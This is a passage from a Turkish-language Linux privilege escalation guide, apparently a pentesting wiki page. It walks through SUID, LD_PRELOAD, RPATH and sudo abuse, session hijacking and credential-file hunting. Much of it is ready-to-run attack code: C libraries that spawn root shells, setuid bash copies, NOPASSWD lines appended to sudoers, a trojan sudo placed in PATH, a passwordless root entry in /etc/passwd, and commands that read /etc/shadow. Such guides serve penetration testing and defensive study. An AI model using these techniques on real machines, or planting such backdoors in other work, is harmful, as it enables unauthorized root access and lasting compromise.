[Çalıştırılacak payload örnekleri.](payloads-to-execute.md)

### Komut yolu ile SUID binary

Eğer **suid** binary başka bir komutu yolu belirterek **çalıştırıyorsa**, o zaman suid dosyasının çağırdığı komutla aynı ada sahip bir **function** export etmeyi deneyebilirsiniz.

Örneğin, bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, function oluşturup onu export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonra, suid binary’yi çağırdığınızda, bu function yürütülecektir

### Bir SUID wrapper tarafından yürütülen writable script

Yaygın bir custom-app misconfiguration, script’i çalıştıran root-owned SUID binary wrapper’dır; buna karşılık script’in kendisi düşük yetkili users tarafından writable durumdadır.

Tipik pattern:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Eğer `/usr/local/bin/backup.sh` yazılabilir durumdaysa, payload komutlarını ekleyebilir ve ardından SUID wrapper'ı çalıştırabilirsiniz:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Hızlı kontroller:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Bu saldırı yolu özellikle `/usr/local/bin` içinde dağıtılan "maintenance"/"backup" wrapper'larında yaygındır.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable, loader tarafından standard C library (`libc.so`) dahil olmak üzere diğerlerinin önüne yüklenecek bir veya daha fazla shared library (.so dosyası) belirtmek için kullanılır. Bu süreç, bir library'nin preloading edilmesi olarak bilinir.

Ancak, system security'yi korumak ve özellikle **suid/sgid** executable'larla bu özelliğin kötüye kullanılmasını önlemek için sistem belirli koşulları uygular:

- Loader, gerçek user ID (_ruid_) effective user ID (_euid_) ile eşleşmeyen executable'lar için **LD_PRELOAD**'u yok sayar.
- suid/sgid olan executable'lar için yalnızca standard paths içindeki ve aynı zamanda suid/sgid olan library'ler preloaded edilir.

`sudo` ile commands çalıştırma yetkiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa privilege escalation gerçekleşebilir. Bu configuration, **LD_PRELOAD** environment variable'ının korunmasına ve commands `sudo` ile çalıştırıldığında bile tanınmasına izin verir; bu da elevated privileges ile arbitrary code çalıştırılmasına yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
/tmp/pe.c
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ardından bunu şu şekilde **compile it** kullanarak:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **privilegileri yükselt** çalıştırılırken
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env variable'ını kontrol ediyorsa kötüye kullanılabilir çünkü kütüphanelerin aranacağı path'i kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

**SUID** izinlerine sahip ve alışılmadık görünen bir binary ile karşılaştığınızda, **.so** dosyalarını doğru şekilde yükleyip yüklemediğini kontrol etmek iyi bir uygulamadır. Bu, aşağıdaki komutu çalıştırarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşmak, istismar için bir potansiyel olduğunu gösterir.

Bunu istismar etmek için, biri bir C dosyası oluşturur, örneğin _"/path/to/.config/libcalc.c"_ ve içine aşağıdaki kodu ekler:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlenip çalıştırıldığında, dosya izinlerini değiştirerek ve yükseltilmiş ayrıcalıklarla bir shell çalıştırarak yetkileri yükseltmeyi hedefler.

Yukarıdaki C dosyasını bir shared object (.so) dosyasına şu şekilde derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'yi çalıştırmak exploit'i tetiklemeli ve potansiyel system compromise'a izin vermelidir.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Artık yazabildiğimiz bir klasörden bir library yükleyen bir SUID binary bulduğumuza göre, gerekli isimle o klasörde library’i oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Bir hata alırsanız, örneğin
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) bir saldırganın yerel güvenlik kısıtlamalarını aşmak için istismar edebileceği Unix binary’lerinin derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise yalnızca bir komuta **argument inject** edebildiğiniz durumlar için aynı şeydir.

Proje, restricted shell’lerden çıkmak, ayrıcalıkları yükseltmek veya korumak, dosya transferi yapmak, bind ve reverse shell oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilen Unix binary’lerinin meşru fonksiyonlarını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` erişiminiz varsa, [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanarak herhangi bir sudo kuralını nasıl istismar edeceğini bulup bulmadığını kontrol edebilirsiniz.

### Reusing Sudo Tokens

Eğer **sudo access**'iniz varsa ama parolanız yoksa, **bir sudo komutu çalıştırılmasını bekleyip ardından session token’ı hijack ederek** ayrıcalıkları yükseltebilirsiniz.

Ayrıcalıkları yükseltmek için gereksinimler:

- `_sampleuser_` kullanıcısı olarak bir shell’iniz zaten var
- `_sampleuser_`, **son 15 dakika içinde** bir şey çalıştırmak için **`sudo` kullanmış** olmalı (varsayılan olarak bu, `sudo`'yu parola girmeden kullanmamızı sağlayan sudo token süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` değeri 0
- `gdb` erişilebilir olmalı (yükleyebilmelisiniz)

(`ptrace_scope` değerini geçici olarak `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya `/etc/sysctl.d/10-ptrace.conf` dosyasını kalıcı olarak değiştirip `kernel.yama.ptrace_scope = 0` ayarlayabilirsiniz)

Eğer tüm bu gereksinimler karşılanıyorsa, **şu yöntemle ayrıcalıkları yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **İlk exploit** (`exploit.sh`), _/tmp_ içinde `activate_sudo_token` binary’sini oluşturacaktır. Bunu **session’ınızda sudo token’ı aktive etmek** için kullanabilirsiniz (otomatik olarak root shell almayacaksınız, `sudo su` yapın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **İkinci exploit** (`exploit_v2.sh`) _/tmp_ içinde **root tarafından sahip olunan ve setuid olan** bir sh shell oluşturacaktır
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Üçüncü exploit** (`exploit_v3.sh`), **sudo tokenlarını kalıcı hale getiren ve tüm kullanıcıların sudo kullanmasına izin veren** bir **sudoers dosyası oluşturacak**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Eğer klasörde veya klasör içindeki oluşturulmuş dosyalardan herhangi birinde **write permissions** varsa, [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) binary’sini kullanarak bir kullanıcı ve PID için **sudo token** oluşturabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabiliyorsanız ve o kullanıcı olarak PID 1234 ile bir shell’iniz varsa, şifreyi bilmeden **sudo privileges** elde etmek için şunu yapabilirsiniz:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` dosyası ve `/etc/sudoers.d` içindeki dosyalar, kimlerin `sudo` kullanabileceğini ve nasıl kullanacağını yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız**, **bazı ilginç bilgiler** elde edebilirsiniz ve herhangi bir dosyaya **yazabiliyorsanız**, **privilege escalation** yapabilirsiniz.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazabiliyorsan, bu izni kötüye kullanabilirsin
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın başka bir yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` binary'sine alternatifler vardır, örneğin OpenBSD için `doas`; yapılandırmasını `/etc/doas.conf` adresinde kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer **bir kullanıcının genellikle bir makineye bağlanıp yetkileri yükseltmek için `sudo` kullandığını** biliyorsanız ve o kullanıcı bağlamında bir shell elde ettiyseniz, root olarak kendi kodunuzu çalıştıracak ve ardından kullanıcının komutunu yürütecek **yeni bir sudo executable** oluşturabilirsiniz. Sonra, kullanıcı bağlamının **$PATH** değerini değiştirin (örneğin yeni path'i .bash_profile içine ekleyerek) ki kullanıcı `sudo` çalıştırdığında sizin `sudo` executable'ınız çalışsın.

Kullanıcının farklı bir shell kullanması durumunda (bash değilse), yeni path'i eklemek için başka dosyaları değiştirmeniz gerekir. Örneğin[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Ya da buna benzer bir şey çalıştırarak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

`/etc/ld.so.conf` dosyası, **yüklenmiş konfigürasyon dosyalarının nereden geldiğini** belirtir. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki konfigürasyon dosyalarının okunacağı anlamına gelir. Bu konfigürasyon dosyaları, **kütüphanelerin** **aranacağı** başka klasörleri **işaret eder**. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'dir. **Bu, sistemin kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir**.

Eğer bir şekilde **bir kullanıcının** şu yollardan herhangi biri üzerinde yazma izni varsa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki konfigürasyon dosyasının işaret ettiği herhangi bir klasör, yetkileri yükseltebilir.\
Bu yanlış yapılandırmanın **nasıl istismar edileceğine** bakmak için aşağıdaki sayfaya göz atın:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`lib` dosyasını `/var/tmp/flag15/` içine kopyalayarak, `RPATH` değişkeninde belirtildiği gibi program tarafından bu konumda kullanılmasını sağlayabilirsiniz.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından, `/var/tmp` içinde şu komutla bir evil library oluşturun: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities, bir sürece **mevcut root yetkilerinin bir alt kümesini** sağlar. Bu, root **yetkilerini daha küçük ve ayırt edici birimlere** etkili biçimde böler. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Böylece tam yetki seti azaltılır ve istismar riski düşürülür.\
Aşağıdaki sayfayı okuyarak **capabilities hakkında daha fazla bilgi edinin ve bunları nasıl kötüye kullanacağınızı öğrenin**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

Bir directory içinde, **"execute" biti**, etkilenen kullanıcının klasör içine "**cd**" yapabileceği anlamına gelir.\
**"read"** biti, kullanıcının **files** listesini görebileceği anlamına gelir ve **"write"** biti, yeni **files** **silmesine** ve **oluşturmasına** izin verir.

## ACLs

Access Control Lists (ACLs), isteğe bağlı permissions'ın ikincil katmanını temsil eder ve **geleneksel ugo/rwx permissions'ı geçersiz kılabilir**. Bu permissions, belirli owner olmayan ya da group'un parçası olmayan kullanıcılara hak vererek veya reddederek file ya da directory erişimi üzerinde kontrolü artırır. Bu **ayrıntı düzeyi, daha hassas erişim yönetimi** sağlar. Daha fazla ayrıntı [**burada**](https://linuxconfig.org/how-to-manage-acls-on-linux) bulunabilir.

"kali" kullanıcısına bir file üzerinde read ve write permissions verin:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Belirli ACL'lere sahip** dosyaları sistemden **Get** edin:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-ins üzerinde gizli ACL backdoor

Yaygın bir yanlış yapılandırma, `/etc/sudoers.d/` içinde mode `440` olan, ancak yine de ACL üzerinden düşük yetkili bir kullanıcıya yazma erişimi veren root-owned bir dosyadır.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Eğer `user:alice:rw-` gibi bir şey görürsen, kullanıcı kısıtlayıcı mode bits’e rağmen bir sudo kuralı ekleyebilir:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Bu, `ls -l`-only incelemelerde kolayca gözden kaçabilecek, yüksek etkili bir ACL persistence/privesc yoludur.

## Open shell sessions

**old versions** içinde farklı bir kullanıcının (**root**) bazı **shell** session’ını **hijack** edebilirsiniz.\
**newest versions** içinde yalnızca kendi kullanıcınıza ait screen session’larına **connect** edebileceksiniz. Ancak, session içinde **interesting information** bulabilirsiniz.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Bir oturuma bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümleri** ile ilgili bir sorundu. root tarafından oluşturulmuş bir tmux (v2.1) oturumunu yetkisiz bir kullanıcı olarak hijack etmeyi başaramadım.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Bir oturuma bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) Eylül 2006 ile 13 Mayıs 2008 arasında üretilen tüm SSL ve SSH keys bu bug’dan etkilenmiş olabilir.\
Bu bug, bu OS’lerde yeni bir ssh key oluşturulurken meydana gelir; çünkü **yalnızca 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key’e sahip olarak karşılık gelen private key’i arayabileceğiniz** anlamına gelir. Hesaplanan olasılıkları burada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** password authentication’a izin verilip verilmediğini belirtir. Varsayılan `no`’dur.
- **PubkeyAuthentication:** public key authentication’a izin verilip verilmediğini belirtir. Varsayılan `yes`’tir.
- **PermitEmptyPasswords**: password authentication’a izin verildiğinde, server’ın boş password string’lerine sahip hesaplara login’e izin verip vermediğini belirtir. Varsayılan `no`’dur.

### Login control files

Bu files, kimin login olabileceğini ve nasıl olacağını etkiler:

- **`/etc/nologin`**: varsa, root olmayan login’leri engeller ve mesajını gösterir.
- **`/etc/securetty`**: root’un nereden login olabileceğini sınırlar (TTY allowlist).
- **`/etc/motd`**: login sonrası banner (environment veya maintenance detaylarını leak edebilir).

### PermitRootLogin

root’un ssh kullanarak login olabileceğini belirtir, varsayılan `no`’dur. Olası değerler:

- `yes`: root, password ve private key kullanarak login olabilir
- `without-password` or `prohibit-password`: root yalnızca private key ile login olabilir
- `forced-commands-only`: Root yalnızca private key kullanarak ve commands options belirtilmişse login olabilir
- `no` : no

### AuthorizedKeysFile

User authentication için kullanılabilecek public key’leri içeren files’ı belirtir. `%h` gibi, home directory ile değiştirilecek token’lar içerebilir. **Absolute paths** (`/` ile başlayan) veya **user's home içinden relative paths** belirtebilirsiniz. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, "**testusername**" kullanıcısının **private** key’i ile giriş yapmayı denediğinizde ssh’nin, anahtarınızın public key’ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içinde bulunanlarla karşılaştıracağını gösterir

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, anahtarları bırakmak yerine kendi yerel SSH key’lerinizi **kullanmanıza** olanak tanır (passphrase olmadan!) ve bunları sunucunuzda tutmak yerine kullanmanızı sağlar. Böylece ssh üzerinden bir **host**’a **jump** yapabilecek ve oradan, başlangıç **host**’unuzda bulunan **key**’i **kullanarak** başka bir **host**’a **jump** yapabileceksiniz.

Bu seçeneği `$HOME/.ssh.config` içinde şöyle ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
`Host` `*` ise, kullanıcı her farklı makineye geçtiğinde o host anahtarlara erişebilecektir (bu bir güvenlik sorunudur).

`/etc/ssh_config` dosyası bu **options** değerini **override** edebilir ve bu yapılandırmaya izin verebilir ya da onu reddedebilir.\
`/etc/sshd_config` dosyası, `AllowAgentForwarding` anahtar sözcüğü ile ssh-agent forwarding’e **allow** veya **denied** verebilir (varsayılan **allow**).

Eğer bir ortamda Forward Agent yapılandırılmış olduğunu fark ederseniz, aşağıdaki sayfayı okuyun çünkü bunu ayrıcalık yükseltmek için abuse edebilirsiniz:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

`/etc/profile` dosyası ve `/etc/profile.d/` altındaki dosyalar, bir kullanıcı yeni bir shell çalıştırdığında yürütülen **scripts**tir. Bu nedenle, bunlardan herhangi birine **yazabilir** veya onları **modify** edebilirseniz, ayrıcalık yükseltebilirsiniz.
```bash
ls -l /etc/profile /etc/profile.d/
```
Eğer herhangi bir tuhaf profile script bulunursa, onu **hassas detaylar** için kontrol etmelisiniz.

### Passwd/Shadow Files

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir ad kullanıyor olabilir ya da bir yedekleri olabilir. Bu nedenle hepsini **bulmanız** ve dosyaları **okuyup okuyamadığınızı kontrol etmeniz**, dosyaların içinde **hash'ler** olup olmadığını görmek için önerilir:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğeri) dosyası içinde **password hashes** bulabilirsiniz
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ardından `hacker` kullanıcısını ekleyin ve oluşturulan parolayı ekleyin.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
WARNING: mevcut makinenin güvenliğini düşürebilirsiniz.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: BSD platformlarında `/etc/passwd`, `/etc/pwd.db` ve `/etc/master.passwd` konumundadır, ayrıca `/etc/shadow` dosyasının adı `/etc/spwd.db` olarak değiştirilmiştir.

Bazı hassas dosyalara **yazıp yazamadığınızı** kontrol etmelisiniz. Örneğin, bazı **service configuration file** dosyalarına yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makine bir **tomcat** server çalıştırıyorsa ve **/etc/systemd/ içindeki Tomcat service configuration file** dosyasını değiştirebiliyorsanız, şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacak.

### Klasörleri Kontrol Et

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Garip Konum/Sahiplenilmiş dosyalar
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son dakikalarda değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH içindeki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Şifreler içeren bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu okuyun, **şifreler içerebilecek birkaç olası dosyayı** arar.\
Bunu yapmak için kullanabileceğiniz **bir diğer ilginç araç** ise: [**LaZagne**](https://github.com/AlessandroZ/LaZagne); bu, Windows, Linux ve Mac için yerel bir bilgisayarda saklanan birçok şifreyi geri almak için kullanılan açık kaynaklı bir uygulamadır.

### Loglar

Logları okuyabiliyorsanız, bunların içinde **ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar tuhafsa, o kadar ilginç olacaktır (muhtemelen).\
Ayrıca, bazı "**kötü**" yapılandırılmış (backdoored?) **audit loglar**, bu gönderide açıklandığı gibi audit loglar içine **şifre kaydetmenize** izin verebilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Grupları **okumak** için [**adm**](interesting-groups-linux-pe/index.html#adm-group) gerçekten faydalı olacaktır.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ayrıca adı içinde ya da içeriğinde "**password**" kelimesi bulunan dosyaları kontrol etmeli, ayrıca loglar içinde IP’leri ve e-postaları, ya da hashes regexps’lerini de kontrol etmelisiniz.\
Burada bunların hepsini nasıl yapacağımı listelemeyeceğim ama ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsiniz.

## Writable files

### Python library hijacking

